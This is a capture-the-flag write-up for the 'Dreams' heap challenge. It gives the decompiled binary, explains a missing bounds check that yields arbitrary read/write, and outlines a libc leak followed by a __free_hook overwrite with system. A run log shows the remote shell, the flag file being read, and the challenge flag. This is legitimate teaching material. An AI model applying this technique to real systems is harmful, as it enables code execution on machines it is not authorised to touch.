# Dreams
`ghidra` output
```c
void main(void) {
    long in_FS_OFFSET;
    int local_18;
    __gid_t local_14;
    undefined8 local_10;
  
    local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
    setbuf(stdout,(char *)0x0);
    local_14 = getegid();
    setresgid(local_14,local_14,local_14);
    dreams = malloc((long)(MAX_DREAMS << 3));
    puts("Welcome to the dream tracker.");
    puts("Sleep is where the deepest desires and most pushed-aside feelings of humankind are brought out.");
    puts("Confide a month of your time.");
    local_18 = 0;
    while( true ) {
        while( true ) {
            menu();
            printf("> ");
            __isoc99_scanf(&DAT_00402104,&local_18);
            getchar();
            if (local_18 != 3) break;
            psychiatrist();
        }
        if (3 < local_18) break;
        if (local_18 == 1) {
            gosleep();
        }
        else {
            if (local_18 != 2) break;
            sell();
        }
    }
    puts("Invalid input!");
    exit(1);
}

void psychiatrist(void) {
    long in_FS_OFFSET;
    int local_14;
    long local_10;
  
    local_10 = *(long *)(in_FS_OFFSET + 0x28);
    puts("Due to your HMO plan, you can only consult me to decipher your dream.");
    printf("What dream is giving you trouble? ");
    local_14 = 0;
    __isoc99_scanf(&DAT_00402104,&local_14);
    getchar();
    if (*(long *)(dreams + (long)local_14 * 8) == 0) {
        puts("Invalid dream!");
        exit(1);
    }
    printf("Hmm... I see. It looks like your dream is telling you that ");
    puts((char *)(*(long *)(dreams + (long)local_14 * 8) + 8));
    puts("Due to the elusive nature of dreams, you now must dream it on a different day. Sorry, I don\' t make the rules. Or do I?");
    printf("New date: ");
    read(0,*(void **)(dreams + (long)local_14 * 8),8);
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }
    return;
}

void gosleep(void) {
    size_t sVar1;
    long in_FS_OFFSET;
    int local_1c;
    char *local_18;
    long local_10;
  
    local_10 = *(long *)(in_FS_OFFSET + 0x28);
    puts("3 doses of Ambien finally calms you down enough to sleep.");
    puts("Toss and turn all you want, your unconscious never loses its grip.");
    printf("In which page of your mind do you keep this dream? ");
    local_1c = 0;
    __isoc99_scanf(&DAT_00402104,&local_1c);
    getchar();
    if (((local_1c < MAX_DREAMS) && (-1 < local_1c)) && (*(long *)(dreams + (long)local_1c * 8) == 0))
    {
        local_18 = (char *)malloc(0x1c);
        printf("What\'s the date (mm/dd/yy))? ");
        read(0,local_18,8);
        sVar1 = strcspn(local_18,"\n");
        local_18[sVar1] = '\0';
        printf("On %s, what did you dream about? ",local_18);
        read(0,local_18 + 8,0x14);
        *(char **)((long)local_1c * 8 + dreams) = local_18;
        if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
            __stack_chk_fail();
        }
        return;
    }
    puts("Invalid index!");
    exit(1);
}

void sell(void) {
    long in_FS_OFFSET;
    int local_14;
    long local_10;
  
    local_10 = *(long *)(in_FS_OFFSET + 0x28);
    puts("You\'ve come to sell your dreams.");
    printf("Which one are you trading in? ");
    local_14 = 0;
    __isoc99_scanf(&DAT_00402104,&local_14);
    getchar();
    if ((local_14 < MAX_DREAMS) && (-1 < local_14)) {
        puts("You let it go. Suddenly you feel less burdened... less restrained... freed. At last.");
        free(*(void **)(dreams + (long)local_14 * 8));
        puts("Your money? Pfft. Get out of here.");
        if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
            __stack_chk_fail();
        }
        return;
    }
    puts("Out of bounds!");
    exit(1);
}
```
In the `psychiatrist` function, where it reads a number from stdin and outputs the string at that index in the dreams array. The vulnerability is that it does not do bounds checking, it instead checks that the pointer is not null. The dreams array is `malloc`ed at the beginning of main, and the `gosleep` function `malloc`s buffers and stores them in the dreams array.<br>
We can exploit the fact that both buffers are stored on the heap by giving the psychiatrist function an offset that will point it to our input. It will then interpret our input as a `char *` and allow us to read and write to that pointer.<br>
The first step is computing the offset between the dreams array and the buffers created in `gosleep`. Strangely when running the binary in `gdb` the offset was 1088 bytes or 136 pointers, but when running the binary through `pwntools` the offset was different. In order to determine the correct offset I wrote a brute force script that tried every single offset from 10 to 1000. The correct offset was found when the program ended in a segfault. The offset turned out to be 4168 bytes or 521 pointers.<br>
One small complication was that the binary was compiled with Full Relro, meaning that the GOT table was read only. But the `libc.so.6` the binary was using only had Partial Relro, so a function pointer in `libc.so.6` would have to be overwritten instead. <br>
The attack was relatively simple after that as the program provided arbitrary read and write gadgets.
1. read the dynamic address of `puts`
2. calculate libc base
3. overwrite `__free_hook` with system
4. free a chunk with `"/bin/sh\x00"` inside
5. shell

```
[+] Opening connection to challs.actf.co on port 31227: Done
[*] '/home/runner/nothingtosee/DREAMS/dreams'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/runner/nothingtosee/DREAMS/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
GOT_SYM equ 0x403f90
LIB SYM: 0x84450
b'PD\xb4^\xe4\x7f\x00\x00'
LEAKED SYM: 0x7fe45eb44450
LIBC ADDRESS: 0x7fe45eac0000
FREE HOOK: 0x7fe45ecaee48
[*] Switching to interactive mode
You let it go. Suddenly you feel less burdened... less restrained... freed. At last.
$ ls
flag.txt
run
$ cat flag.txt
actf{hav3_you_4ny_dreams_y0u'd_like_to_s3ll?_cb72f5211336}
```
## Flag: actf{hav3_you_4ny_dreams_y0u'd_like_to_s3ll?_cb72f5211336}